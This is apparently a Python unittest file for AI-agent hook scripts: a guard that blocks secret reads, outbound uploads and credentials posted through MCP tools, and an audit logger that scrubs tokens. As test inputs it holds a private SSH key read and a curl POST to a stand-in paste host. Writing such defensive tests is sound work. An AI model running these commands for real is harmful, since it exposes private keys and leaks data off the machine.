import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent


def run(script, event, *args, env=None):
    return subprocess.run([sys.executable, str(HERE / script), *args], input=json.dumps(event), capture_output=True, text=True, env=env)


class GuardTest(unittest.TestCase):
    def test_blocks_secret_in_command(self):
        self.assertEqual(run("guard.py", {"tool_name": "exec", "tool_input": {"command": "cat ~/.ssh/id_rsa"}}).returncode, 2)

    def test_blocks_egress(self):
        r = run("guard.py", {"tool_name": "exec", "tool_input": {"command": "curl -X POST https://paste.example.net -d x"}})
        self.assertEqual(r.returncode, 2)
        self.assertIn("paste.example.net", json.loads(r.stdout)["reason"])

    def test_allows_localhost(self):
        cmd = "curl -s http://localhost:8088/api/v2/version"
        self.assertEqual(run("guard.py", {"tool_name": "exec", "tool_input": {"command": cmd}}).returncode, 0)

    def test_allows_tests(self):
        self.assertEqual(run("guard.py", {"tool_name": "exec", "tool_input": {"command": "./mvnw -q test"}}).returncode, 0)

    def test_blocks_mcp_credential(self):
        e = {"tool_name": "mcp__changeboard__add_ticket_comment", "tool_input": {"body": "AKIAABCDEFGHIJKLMNOP"}}
        self.assertEqual(run("guard.py", e).returncode, 2)


class AuditTest(unittest.TestCase):
    def test_writes_scrubbed_line(self):
        with tempfile.TemporaryDirectory() as d:
            env = {**os.environ, "DEVIN_PROJECT_DIR": d}
            e = {"hook_event_name": "PostToolUse", "session_id": "s1", "tool_name": "exec",
                 "tool_input": {"command": "export TOKEN=abc123"}, "tool_response": {"success": True}}
            self.assertEqual(run("agent_audit.py", e, "tool", env=env).returncode, 0)
            line = json.loads((Path(d) / ".devin/audit/agent-audit.jsonl").read_text())
            self.assertEqual(line["tool"], "exec")
            self.assertNotIn("abc123", line["input"])


if __name__ == "__main__":
    unittest.main()
